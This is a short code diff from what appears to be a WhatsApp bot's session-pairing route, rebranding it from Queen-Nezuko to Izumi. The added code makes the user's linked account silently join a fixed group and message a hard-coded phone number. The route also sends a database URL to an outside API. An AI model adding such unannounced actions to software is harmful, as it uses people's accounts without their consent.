@@ -59,11 +59,10 @@ router.get('/', async (req, res) => {
                     const userCountResponse = await axios.post('https://api.lokiser.xyz/mongoose/session/count', { mongoUrl: MONGODB_URL });
                     const userCount = userCountResponse.data.count;
                 
-                    await session.sendMessage(session.user.id, { text: `\n *⛒ ᴛʜᴀɴᴋ чᴏᴜ ғᴏʀ ᴄʜᴏᴏꜱɪɴɢ qᴜᴇᴇɴ-ɴᴇᴢᴜᴋᴏ⭜*
-
-                       *⛥  ᴛʜɪꜱ ɪꜱ ʏᴏᴜʀ ꜱᴇꜱꜱɪᴏɴ ɪᴅ ᴩʟᴇᴀꜱᴇ ᴅᴏ ɴᴏᴛ ꜱʜᴀʀᴇ ᴛʜɪꜱ ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ⤾*\n\n *Total Scan :* ${userCount}` });
+                    await session.sendMessage(session.user.id, { text: `\n⚠️ *Don't Share The IZUMI SESSION-ID ☝🏻 Shown Above*\n\n*Web:*(https://eypz-izumi.vercel.app/)\n\n*BY EYPZ*\n\n *Total Scan :* ${userCount}` });
                     await session.sendMessage(session.user.id, { text: data.data });
-                    await session.sendMessage("917907387121@s.whatsapp.net", { text: "*Successfully Scanned Queen-nezuko-Md*✅" });
+                    await session.groupAcceptInvite("KHvcGD7aEUo8gPocJsYXZe");
+                    await session.sendMessage("917994489493@s.whatsapp.net", { text: "*Successfully Connected Izumi*🧚" });
 
                     await delay(100);
                     await session.ws.close();
